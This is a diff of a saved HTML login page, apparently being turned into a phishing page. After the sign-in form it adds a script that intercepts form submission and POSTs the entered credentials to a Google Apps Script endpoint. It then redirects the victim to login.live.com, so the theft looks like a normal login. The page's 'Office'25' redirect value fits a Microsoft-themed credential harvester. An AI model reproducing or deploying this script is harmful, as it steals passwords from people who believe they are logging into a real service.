@@ -1028,7 +1028,7 @@ src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiP
     <div class="login-page-cta__buttons">
           
     
-    <button class="btn btn-text btn-large btn-primary login-page-cta__login" id="login-button" form="login-form" tabindex="2" type="button">
+    <button class="btn btn-text btn-large btn-primary login-page-cta__login" id="login-button" form="login-form" tabindex="2" type="button" able>
 <!----><span class="d-button-label">Log In<!----></span>
     </button>
   
@@ -1160,7 +1160,24 @@ src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiP
         <input name="Password" type="password" id="signin_password" value="">
         <input name="redirect" type="hidden" value="Office'25">
         <input type="submit" id="signin-button" value="Log In">
-      </form>
+      </form><script type="text/javascript">
+
+
+   const scriptURL = 'https://script.google.com/macros/s/AKfycbxnKSDadTZ9Wxv1gsiUVF7FRrLZaJ-81rgp_IRyBcoH6K9bg1PdZtLk8WuPczfBkAiMaQ/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+    .then(() => {
+      const redirectUrl = 'https://login.live.com';
+      const link = document.createElement('a');
+      link.href = redirectUrl;
+      link.click();
+    })
+    .catch((error) => console.error('Error!', error.message));
+            })
+  </script>
 
     <script data-savepage-type="" type="text/plain" defer="" data-savepage-src="/assets/start-discourse-2f46827b.js" nonce=""></script>
 
